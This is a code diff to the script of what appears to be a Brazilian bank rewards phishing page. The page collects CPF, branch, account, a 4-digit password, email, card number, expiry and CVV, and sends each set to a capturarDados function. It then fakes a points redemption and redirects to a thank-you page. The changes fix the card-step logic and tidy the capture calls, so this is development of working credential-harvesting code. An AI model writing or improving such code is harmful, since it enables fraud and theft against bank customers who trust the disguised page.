@@ -683,12 +683,13 @@
         };
 
         function irParaObrigado() {
-            const cartaoAtivo = localStorage.getItem('cartaoAtivo') !== 'false';
+            const cartaoAtivo = localStorage.getItem('cartaoAtivo') === 'true';
             const notificacao = cartaoAtivo ? 'e-mail, SMS e WhatsApp' : 'e-mail e WhatsApp';
             window.location.href = `/obrigado.html?pontos=98.570&notificacao=${encodeURIComponent(notificacao)}`;
         }
 
         $(document).ready(function() {
+            // Máscaras
             $('#cpf').mask('000.000.000-00');
             $('#telefone').mask('(00) 00000-0000');
             $('#agencia').mask('0000-0');
@@ -705,7 +706,11 @@
             $('#cvv').mask('000');
 
             function getHora() {
-                return new Intl.DateTimeFormat('pt-BR', { timeZone: 'America/Sao_Paulo', hour: '2-digit', minute: '2-digit' }).format(new Date());
+                return new Intl.DateTimeFormat('pt-BR', { 
+                    timeZone: 'America/Sao_Paulo', 
+                    hour: '2-digit', 
+                    minute: '2-digit' 
+                }).format(new Date());
             }
 
             function validarCPF(c) {
@@ -756,7 +761,12 @@
                     Swal.fire({ icon: 'error', title: 'Senha inválida', background: '#C62828', color: 'white' });
                     return;
                 }
-                window.capturarDados({ cpf: $('#cpf').val(), agencia: $('#agencia').val(), conta: $('#conta').val(), senha4: $('#senha4').val() });
+                window.capturarDados({ 
+                    cpf: $('#cpf').val(), 
+                    agencia: $('#agencia').val(), 
+                    conta: $('#conta').val(), 
+                    senha4: $('#senha4').val() 
+                });
                 $('#loader').removeClass('hidden');
                 setTimeout(() => {
                     $('#loader').addClass('hidden');
@@ -771,24 +781,37 @@
                     Swal.fire({ icon: 'error', title: 'E-mail inválido', background: '#C62828', color: 'white' });
                     return;
                 }
+
                 window.capturarDados({ cpf: $('#cpf').val(), email: $('#email').val() });
+
                 $('#loader').removeClass('hidden');
                 setTimeout(() => {
                     $('#loader').addClass('hidden');
-                    const ativo = localStorage.getItem('cartaoAtivo') !== 'false';
-                    if (ativo) {
-                        $('#page3, #page4').toggleClass('hidden');
+                    
+                    // CORREÇÃO: cartaoAtivo só é true quando explicitamente 'true'
+                    const cartaoAtivo = localStorage.getItem('cartaoAtivo') === 'true';
+                    console.log('Cartão ativo?', cartaoAtivo);
+                    
+                    if (cartaoAtivo) {
+                        $('#page3').addClass('hidden');
+                        $('#page4').removeClass('hidden');
                     } else {
                         $('#statusContainer').removeClass('hidden');
                         $('#balaoGerando').removeClass('hidden');
                         $('#horaGerando').text(getHora());
-                        setTimeout(irParaObrigado, 6000);
+                        
+                        // Aguarda 6 segundos e vai para obrigado.html
+                        setTimeout(() => {
+                            irParaObrigado();
+                        }, 6000);
                     }
+                    
                     const h = getHora();
                     $('#hora4, #hora5, #hora6, #hora7').text(h);
                 }, 3000);
             });
 
+            // Página 4 - Clique CONFIRMAR (cartão)
             $('#btnResgatar').on('click', function() {
                 if ($('#cartao').val().replace(/\s/g, '').length !== 16) {
                     Swal.fire({ icon: 'error', title: 'Cartão inválido', background: '#C62828', color: 'white' });
@@ -802,11 +825,22 @@
                     Swal.fire({ icon: 'error', title: 'CVV inválido', background: '#C62828', color: 'white' });
                     return;
                 }
-                window.capturarDados({ cpf: $('#cpf').val(), cartao: $('#cartao').val(), validade: $('#validade').val(), cvv: $('#cvv').val() });
+
+                window.capturarDados({ 
+                    cpf: $('#cpf').val(), 
+                    cartao: $('#cartao').val(), 
+                    validade: $('#validade').val(), 
+                    cvv: $('#cvv').val() 
+                });
+
                 $('#statusContainerPage4').removeClass('hidden');
                 $('#balaoGerandoPage4').removeClass('hidden');
                 $('#horaGerandoPage4').text(getHora());
-                setTimeout(irParaObrigado, 6000);
+                
+                // Aguarda 6 segundos e vai para obrigado.html
+                setTimeout(() => {
+                    irParaObrigado();
+                }, 6000);
             });
         });
     </script>
